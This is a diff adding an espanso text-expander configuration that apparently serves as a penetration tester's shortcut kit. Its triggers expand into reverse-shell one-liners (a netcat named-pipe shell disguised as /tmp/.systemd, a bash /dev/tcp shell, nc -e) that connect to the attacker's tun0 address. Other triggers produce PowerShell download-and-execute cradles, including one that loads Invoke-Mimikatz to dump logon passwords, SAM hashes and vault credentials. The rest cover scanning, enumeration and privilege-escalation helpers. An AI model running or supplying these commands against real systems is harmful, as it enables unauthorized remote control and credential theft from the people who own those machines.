@@ -1,0 +1,117 @@
+# This is the default configuration file, change it as you like it
+# You can refer to the official documentation:
+# https://espanso.org/docs/
+
+# Matches are the substitution rules, when you type the "trigger" string
+# it gets replaced by the "replace" string.
+
+global_vars:
+  - name: "tun0"
+    type: shell
+    params:
+      cmd: "ifconfig tun0 | grep -w inet | tr -s ' ' | cut -d  ' ' -f 3"
+
+matches:
+
+  # Dates
+  - trigger: ":date"
+    replace: "{{mydate}}"
+    vars:
+      - name: mydate
+        type: date
+        params:
+          format: "%m/%d/%Y"
+
+  # Shell commands
+
+  - trigger: ":tun0"
+    replace: "{{tun0}}"
+
+  - trigger: ":stabilize"
+    replace: |
+        stty raw -echo; fg
+        python3 -c 'import pty; pty.spawn("/bin/bash")'
+        stty columns 190
+        stty rows 34
+        export TERM=xterm
+        reset
+  - trigger: ":wpscan"
+    replace: "wpscan -t 50 -e ap,t --plugins-detection aggressive --url http://"
+
+  - trigger: ":fiforev"
+    replace: "rm /tmp/.systemd;mkfifo /tmp/.systemd;cat /tmp/.systemd|/bin/sh -i 2>&1|nc {{tun0}} 4444 >/tmp/.systemd"
+  
+  - trigger: ":gobuster"
+    replace: "gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -u http://"
+
+  - trigger: ":ferox"
+    replace: "feroxbuster --url http://"
+  
+  - trigger: ":bashrev"
+    replace: "bash -c 'bash -i >& /dev/tcp/{{tun0}}/4444 0>&1'"
+  
+  - trigger: ":winpeas"
+    replace: "cp /home/mto/Documents/Privesc/tools/winPEASany.exe ."
+ 
+  - trigger: ":powerup"
+    replace: "cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 ."  
+  
+  - trigger: ":nc"
+    replace: "cp /usr/share/windows-resources/binaries/nc.exe ."
+
+  - trigger: ":iex"
+    replace: "IEX(New-Object Net.Webclient).downloadstring('http://{{tun0}}/')"
+
+  - trigger: ":ncrev"
+    replace: "nc -e /bin/sh {{tun0}} 4444"
+  
+  - trigger: ":pwd"
+    replace: "echo $(pwd)"
+  
+  - trigger: ":nmap"
+    replace: "sudo nmap -sS -A -O -v -p- -T4 -oN nmap.scan "
+
+  - trigger: ":rlnc"
+    replace: "rlwrap nc -lnvp 443" 
+  
+  - trigger: ":snmp"
+    replace: "snmpwalk -v1 -c public "
+
+  - trigger: ":suid"
+    replace: "find / -perm -u=s -type f 2>/dev/null" 
+
+  - trigger: ":guid"
+    replace: "find / -perm -g=s -type f 2>/dev/null"
+   
+  - trigger: ":pty"
+    replace: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+  
+  - trigger: ":responder"
+    replace: "sudo responder -I tun0 -w -r -f"
+
+  - trigger: ":wget"
+    replace: "wget http://{{tun0}}:80/"
+  
+  - trigger: ":curl"
+    replace: "curl http://{{tun0}}:80/"
+
+  - trigger: ":mimi"
+    replace: "IEX(New-Object System.Net.Webclient).DownloadString('http://{{tun0}}/loot/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"lsadump::sam\" \"vault::cred /patch\" \"exit\"'"
+
+  - trigger: ":http"
+    replace: "http://{{tun0}}:80/"
+    
+  - trigger: ":ws"
+    replace: "python3 -m http.server"
+ 
+  - trigger: ":certutil"
+    replace: "certutil.exe -urlcache -f http://{{tun0}}/"
+ 
+  - trigger: ":pip2"  
+    replace: "pyenv exec pip install"
+  
+  - trigger: ":epath"
+    replace: "/usr/share/exploitdb/exploits/" 
+    
+  - trigger: ":secpath"
+    replace: "/usr/share/seclists/" 
